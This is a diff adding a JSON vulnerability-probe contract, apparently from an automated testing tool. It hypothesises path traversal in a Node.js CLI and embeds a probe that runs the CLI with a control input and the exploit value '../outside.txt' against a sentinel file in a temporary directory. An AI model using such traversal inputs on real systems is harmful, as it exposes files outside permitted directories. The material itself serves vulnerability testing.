@@ -1,0 +1,15 @@
+{
+  "contract_version": "corsair-lite/differential-probe/2",
+  "hypothesis": {
+    "target_file": "cli-target.cjs",
+    "target_symbol": "main",
+    "target_lines": [
+      6,
+      7
+    ],
+    "root_cause": "The CLI resolves an untrusted document path without confining it to the allowed directory.",
+    "expected_violation": "the content of a file outside the allowed directory is returned"
+  },
+  "build_script": "",
+  "probe": "// SPDX-License-Identifier: Apache-2.0\nconst fs = require('node:fs');\nconst os = require('node:os');\nconst path = require('node:path');\nconst { execFileSync } = require('node:child_process');\nconst CONTROL_PAYLOAD = 'document.txt';\nconst EXPLOIT_PAYLOAD = '../outside.txt';\nfunction run_target(payload) {\n  const base = fs.mkdtempSync(path.join(os.tmpdir(), 'corsair-cli-'));\n  try {\n    fs.mkdirSync(path.join(base, 'allowed'));\n    fs.writeFileSync(path.join(base, 'allowed/document.txt'), 'benign-document');\n    fs.writeFileSync(path.join(base, 'outside.txt'), 'OUTSIDE-SENTINEL');\n    const output = execFileSync(\n      process.execPath, ['/work/cli-target.cjs', payload],\n      { cwd: base, encoding: 'utf8', timeout: 5000 },\n    );\n    return JSON.parse(output) !== 'OUTSIDE-SENTINEL';\n  } finally { fs.rmSync(base, { recursive: true, force: true }); }\n}\nmodule.exports = { CONTROL_PAYLOAD, EXPLOIT_PAYLOAD, run_target };\n"
+}
